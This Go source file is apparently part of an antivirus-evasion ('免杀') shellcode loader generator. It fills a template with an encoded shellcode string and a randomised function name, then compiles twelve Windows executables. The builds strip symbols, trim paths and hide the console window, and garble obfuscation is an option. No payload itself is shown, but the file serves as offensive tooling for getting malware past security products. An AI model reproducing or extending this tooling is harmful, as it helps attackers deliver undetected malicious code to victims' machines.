package In

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"os/exec"
	"text/template"
	"time"
)

//修改模板并生成免杀文件
func Tpl_go(enshell, s string) string {
	//取模板名字
	sname := tplname(s)
	tpl(enshell, sname)

	randomStr := CreateRandomString(6)
	Filename := randomStr + ".exe"
	time.Sleep(2)

	//build 生成设置
	var buildmod = "go"
	fmt.Println("[+]请输入Build方式 [默认 go , List: garble ...... ]")
	fmt.Scanln(&buildmod)
	if buildmod == "go" {
		cmd := exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w -s -H=windowsgui", "-trimpath", "-o", "./bin/1.exe", sname+".go")
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w -H=windowsgui", "-trimpath", "-o", "./bin/2.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-s -H=windowsgui", "-trimpath", "-o", "./bin/3.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-s -w", "-trimpath", "-o", "./bin/4.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-s", "-trimpath", "-o", "./bin/5.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w", "-trimpath", "-o", "./bin/6.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w -s -H=windowsgui", "-o", "./bin/7.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w -s", "-o", "./bin/8.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-s", "-o", "./bin/9.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w", "-o", "./bin/10.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-w -H=windowsgui", "-o", "./bin/11.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "go", "build", "-ldflags", "-s -H=windowsgui", "-o", "./bin/12.exe", sname+".go").Run()
		err := cmd.Run()
		if err != nil {
			log.Println("编译报错：没成功啊 臭弟弟！")
		} else {
			log.Println("编译成功：请在Bin目录下查看！")
		}

	} else {
		cmd := exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w -s -H=windowsgui", "-trimpath", "-o", "./bin/1.exe", sname+".go")
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w -H=windowsgui", "-trimpath", "-o", "./bin/2.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-s -H=windowsgui", "-trimpath", "-o", "./bin/3.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-s -w", "-trimpath", "-o", "./bin/4.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-s", "-trimpath", "-o", "./bin/5.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w", "-trimpath", "-o", "./bin/6.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w -s -H=windowsgui", "-o", "./bin/7.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w -s", "-o", "./bin/8.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-s", "-o", "./bin/9.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w", "-o", "./bin/10.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-w -H=windowsgui", "-o", "./bin/11.exe", sname+".go").Run()
		exec.Command("cmd", "/c", "garble", "build", "-ldflags", "-s -H=windowsgui", "-o", "./bin/12.exe", sname+".go").Run()
		err := cmd.Run()
		if err != nil {
			log.Println("编译报错：没成功啊 臭弟弟！")
		} else {
			log.Println("编译成功：请在Bin目录下查看！")
		}
	}
	return Filename

}

func tpl(tshell, tplname string) {
	funcnames := CreateRandomString(6)
	type Inventory struct {
		Exshell string
		Func    string
	}
	Texts := Inventory{tshell, funcnames}
	gname := movfile(tplname)
	tmpl, err := template.ParseFiles(tplname)
	file, err := os.OpenFile(gname, os.O_CREATE|os.O_WRONLY, 0755)
	CheckErr(err)
	err = tmpl.Execute(file, Texts)
	CheckErr(err)
}

func CheckErr(err error) {
	if err != nil {
		panic(err)
	}
}

//随机字符串
func CreateRandomString(len int) string {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

//判断选择模板类型  后期需要在添加
func tplname(src string) string {
	var name string
	name = "./In/template/" + src

	return name

}

func movfile(sourceFile string) string {
	goname := sourceFile + ".go"
	input, err := ioutil.ReadFile(sourceFile)
	if err != nil {
		fmt.Println(err)
	}
	err = ioutil.WriteFile(goname, input, 0644)
	if err != nil {
		fmt.Println("Error creating", goname)
		fmt.Println(err)
	}

	return goname

}
